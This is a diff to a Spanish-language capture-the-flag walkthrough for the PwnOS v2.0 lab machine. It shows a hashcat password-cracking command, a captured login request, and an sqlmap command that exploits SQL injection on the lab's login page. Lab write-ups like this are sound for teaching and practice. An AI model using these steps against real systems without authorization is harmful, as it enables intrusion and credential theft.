@@ -225,4 +225,45 @@ http://10.10.10.100:80/blog/stats.php (Status: 200) [Size: 5694]
 ```
 hashcat -m 500 -a 0 -o cracked.txt md5.txt /usr/share/wordlists/fasttrack.txt -O
 ```
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos6.jpg" width=80% />
+
+
+## 4. Explotando Vulnerabilidades
+
+### 4.1. Inyección SQL (SQLi)
+
+- En el portal principal tenemos una inyección simple de SQL. Está tan simple que vamos a utilizar SQLMAP para obtener todo lo más rápido posible.
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos7.jpg" width=80% />
+
+
+- Capturamos el REQUEST con BURP SUITE y automatizamos el ataque.
+
+```
+POST /login.php HTTP/1.1
+Host: 10.10.10.100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.100/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+Connection: close
+Cookie: PHPSESSID=ctmbn15i5a4r661r2h815go5q5
+Upgrade-Insecure-Requests: 1
+
+email=user&pass=pass&submit=Login&submitted=TRUE
+```
+
+```
+root@kali:~/PWNOS# sqlmap -r logint.txt --random-agent --technique=BTU --current-db
+```
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos8.jpg" width=80% />
+
+
+
+
+
+
 
